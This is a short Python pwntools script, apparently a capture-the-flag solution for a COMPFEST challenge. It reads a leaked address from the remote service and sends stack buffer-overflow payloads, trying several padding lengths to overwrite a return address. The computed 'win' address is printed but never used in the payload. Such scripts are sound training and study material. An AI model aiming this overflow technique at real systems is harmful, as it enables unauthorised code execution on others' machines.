from pwn import *

context.log_level = 'debug'

io = remote( 'challenges.ctf.compfest.id', 9013)

for buffer_size in range(28, 30): 
    io.recvuntil(b':')

    out = io.recvline().strip()
    
    out_int = int(out, 16)
    win_addr = out_int - 0x129b  

    print(f'ini win_addr: {win_addr}')
    
    payload = b'A' * 10 + b'\x00' + b'A' * buffer_size + p64(out_int)
    
    io.send(payload)

    time.sleep(1)

    io.send(b'\n')

    result = io.recvall(timeout=2)  
    print(f"Buffer size {buffer_size}:")
    print(result.decode())
    
    io.close()

    io = remote( 'challenges.ctf.compfest.id', 9013)

io.close()
